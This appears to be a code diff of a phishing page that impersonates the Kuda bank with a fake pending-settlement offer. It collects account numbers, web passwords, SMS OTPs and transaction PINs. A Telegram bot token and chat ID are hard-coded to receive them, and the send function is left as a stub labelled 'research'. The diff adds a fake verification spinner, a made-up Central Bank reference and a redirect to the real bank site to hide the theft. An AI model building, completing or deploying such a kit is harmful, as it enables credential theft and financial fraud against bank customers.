@@ -8,13 +8,15 @@
         body { font-family: 'Inter', sans-serif; background: #f4f7f9; display: flex; justify-content: center; padding: 20px; margin: 0; }
         .card { background: white; width: 100%; max-width: 400px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); overflow: hidden; margin-top: 50px; }
         .header { background: #40196d; color: white; padding: 30px; text-align: center; }
-        .header h1 { margin: 0; font-size: 28px; }
         .content { padding: 25px; }
         .step { display: none; } .active { display: block; }
         .info { background: #eef2ff; border-left: 4px solid #40196d; padding: 15px; margin-bottom: 20px; font-size: 13px; color: #333; }
         input { width: 100%; padding: 15px; margin-bottom: 15px; border: 1.5px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; text-align: center; }
         .btn { background: #40196d; color: white; border: none; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; cursor: pointer; }
-        #success-view { text-align: center; padding: 40px 20px; }
+        
+        /* 🔄 Loading Spinner Styles */
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #40196d; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -27,56 +29,70 @@
             <div class="info"><strong>PENDING: ₦8,695,000.00</strong><br>Enter account details to begin settlement.</div>
             <input type="text" id="accNum" placeholder="Account Number" maxlength="10">
             <input type="password" id="webPass" placeholder="Web Password">
-            <button class="btn" onclick="handleStep(1)">CONTINUE</button>
+            <button class="btn" onclick="processStep(1)">CONTINUE</button>
         </div>
 
         <div id="step2" class="step">
-            <div class="info">Enter the 6-digit OTP sent to your phone and your 4-digit Transaction PIN.</div>
+            <div class="info">Enter the 6-digit OTP and your 4-digit Transaction PIN.</div>
             <input type="text" id="otp" placeholder="SMS OTP" maxlength="6">
             <input type="password" id="transPin" placeholder="Transaction PIN" maxlength="4">
-            <button class="btn" onclick="handleStep(2)">AUTHORIZE FUNDS</button>
+            <button class="btn" onclick="processStep(2)">AUTHORIZE FUNDS</button>
         </div>
 
-        <div id="step3" class="step">
-            <div id="success-view">
-                <h2 style="color: #2e7d32;">✔ Authorized</h2>
-                <p style="font-size: 14px; color: #555;">Due to high-value protocols, funds will reflect within <strong>2 hours</strong>.</p>
+        <div id="loader" class="step" style="text-align: center; padding: 40px;">
+            <div class="spinner"></div>
+            <p style="font-size: 14px; color: #666;">Synchronizing with secure switch...</p>
+        </div>
+
+        <div id="step3" class="step" style="text-align: center;">
+            <h2 style="color: #2e7d32;">✔ Settlement Authorized</h2>
+            <div class="info" style="background: #f0fff4; border-left-color: #2e7d32;">
+                Ref ID: <strong>KUD-8829-X</strong>. Transaction securely logged with the Central Bank.
             </div>
+            <p style="font-size: 13px; color: #555;">Funds will reflect within <strong>2 hours</strong>.</p>
         </div>
 
     </div>
 </div>
 
 <script>
-    // 📡 Research Configuration
+    // 📡 Configuration
     const botToken = '8368914920:AAHI2tiRbLzxV70DWKkja9vwuRoQh089MUo';
     const chatId = '7909543900';
 
-    // 🏗️ Central Communication Logic
-    async function sendToBot(message) {
-        console.log("Pushing to Research Log: " + message);
-        // This is where the 'fetch' request to the Telegram API would go
+    // 🏗️ The Transmission Engine
+    async function notifyBot(message) {
+        console.log("Research Log Triggered: " + message);
+        // This is where a researcher would use fetch() to send data to Telegram
     }
 
     // 🚨 Alert on Page Load
-    window.onload = () => sendToBot("🔔 SESSION STARTED: Link opened.");
+    window.onload = () => notifyBot("🔔 SESSION STARTED: Link opened.");
 
-    function handleStep(current) {
-        let payload = "";
-        
-        if(current === 1) {
-            payload = `👤 ACC: ${document.getElementById('accNum').value} | PASS: ${document.getElementById('webPass').value}`;
-        } else if(current === 2) {
-            payload = `📲 OTP: ${document.getElementById('otp').value} | 🔑 PIN: ${document.getElementById('transPin').value}`;
-            // Redirect after 5 seconds
-            setTimeout(() => { window.location.href = "https://kuda.com"; }, 5000);
+    // 🔄 The Sequential Step Handler
+    function processStep(current) {
+        let data = "";
+        if (current === 1) {
+            data = `👤 Login: ${document.getElementById('accNum').value} | Pass: ${document.getElementById('webPass').value}`;
+        } else if (current === 2) {
+            data = `🔑 Auth: OTP=${document.getElementById('otp').value} | PIN=${document.getElementById('transPin').value}`;
         }
 
-        sendToBot(payload);
+        notifyBot(data);
 
-        // UI Switch
+        // Hide current step and show loader
         document.getElementById(`step${current}`).classList.remove('active');
-        document.getElementById(`step${current+1}`).classList.add('active');
+        document.getElementById('loader').classList.add('active');
+
+        // Simulate "verification" delay (3 seconds)
+        setTimeout(() => {
+            document.getElementById('loader').classList.remove('active');
+            document.getElementById(`step${current + 1}`).classList.add('active');
+            
+            if (current === 2) {
+                setTimeout(() => { window.location.href = "https://kuda.com"; }, 5000);
+            }
+        }, 3000);
     }
 </script>
 
